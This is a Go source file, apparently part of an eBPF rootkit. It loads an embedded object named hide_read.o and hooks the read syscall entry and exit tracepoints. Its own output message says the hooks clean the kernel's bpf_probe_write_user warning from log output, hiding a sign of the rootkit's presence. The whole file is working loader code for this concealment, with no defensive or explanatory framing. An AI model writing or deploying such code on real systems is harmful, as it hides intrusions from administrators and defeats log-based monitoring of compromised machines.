package ebpf

import (
	"bytes"
	_ "embed"
	"fmt"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
)

//go:embed obj/hide_read.o
var hideReadObj []byte

func LoadAndAttachHideRead() (link.Link, link.Link, error) {
	spec, err := ebpf.LoadCollectionSpecFromReader(bytes.NewReader(hideReadObj))
	if err != nil {
		return nil, nil, fmt.Errorf("failed to load spec: %w", err)
	}

	coll, err := ebpf.NewCollection(spec)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to create collection: %w", err)
	}

	enterProg := coll.Programs["hook_read_enter"]
	if enterProg == nil {
		return nil, nil, fmt.Errorf("hook_read_enter program not found")
	}
	exitProg := coll.Programs["hook_read_exit"]
	if exitProg == nil {
		return nil, nil, fmt.Errorf("hook_read_exit program not found")
	}

	enterLink, err := link.Tracepoint("syscalls", "sys_enter_read", enterProg, nil)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to attach sys_enter_read tracepoint: %w", err)
	}
	exitLink, err := link.Tracepoint("syscalls", "sys_exit_read", exitProg, nil)
	if err != nil {
		enterLink.Close()
		return nil, nil, fmt.Errorf("failed to attach sys_exit_read tracepoint: %w", err)
	}

	fmt.Printf("👻 Logs output cleaned from bpf_probe_write_user warning\n")
	return enterLink, exitLink, nil
}
